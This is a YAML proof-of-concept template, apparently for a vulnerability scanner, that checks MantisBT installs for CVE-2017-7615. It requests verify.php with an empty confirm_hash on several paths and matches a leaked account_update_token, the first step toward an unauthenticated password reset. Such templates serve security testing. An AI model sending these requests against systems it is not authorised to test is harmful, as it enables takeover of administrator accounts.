name: poc-yaml-mantisbt-cve-2017-7615-unauth
manual: true
transport: http
payloads:
    payloads:
        req01:
            urlpath: |
                "verify.php?id=1&confirm_hash="
        req02:
            urlpath: |
                "mantis/verify.php?id=1&confirm_hash="
        req03:
            urlpath: |
                "mantisBT/verify.php?id=1&confirm_hash="
        req04:
            urlpath: |
                "mantisbt-2.3.0/verify.php?id=1&confirm_hash="
        req05:
            urlpath: |
                "bugs/verify.php?confirm_hash=&id=1"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /{{urlpath}}
        expression: response.status == 200 && "<input type=\"hidden\" name=\"account_update_token\" value=\"([a-zA-Z0-9_-]+)\"".bmatches(response.body)
expression: r0()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://www.tenable.com/cve/CVE-2017-7615
    vulnerability:
        id: CT-98668
        level: high
